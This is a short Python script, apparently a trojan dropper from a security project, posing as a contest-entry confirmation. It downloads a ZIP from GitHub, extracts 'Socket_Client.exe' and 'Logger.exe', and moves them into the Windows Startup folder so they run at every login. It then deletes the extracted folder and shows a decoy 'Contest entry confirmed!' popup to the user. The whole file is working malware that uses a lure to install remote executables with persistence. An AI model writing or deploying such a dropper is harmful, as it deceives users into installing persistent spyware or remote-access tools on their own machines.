import requests, zipfile, os, getpass, shutil
import tkinter
# from tkinter import *
from tkinter import messagebox


# Download ZIP
url = "https://github.com/StvnLm/SecurityProject/archive/master.zip"
r = requests.get(url)
with open("git.zip", "wb") as code:
    code.write(r.content)
zip = zipfile.ZipFile("git.zip", "r")
zip.extractall(os.getcwd())

# Get current user and MV
user = getpass.getuser()

file_list = ["Socket_Client.exe", "Logger.exe"]

for src_file in file_list:
    file_src = os.getcwd() + "\SecurityProject-master\\" + src_file
    file_dest = f"C:\\Users\{user}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\moved_{src_file}"
    shutil.move(file_src, file_dest)

try:
    os.remove(os.getcwd()+ "\SecurityProject-master")
except Exception:
    pass

# Random 'confirmation' popup
top = tkinter.Tk()
def popup():
    tkinter.messagebox.showinfo("Prize confirmation", "Contest entry confirmed!")

button = tkinter.Button(top, text="Click to confirm your contest entry", command=popup)
button.pack()
top.mainloop()

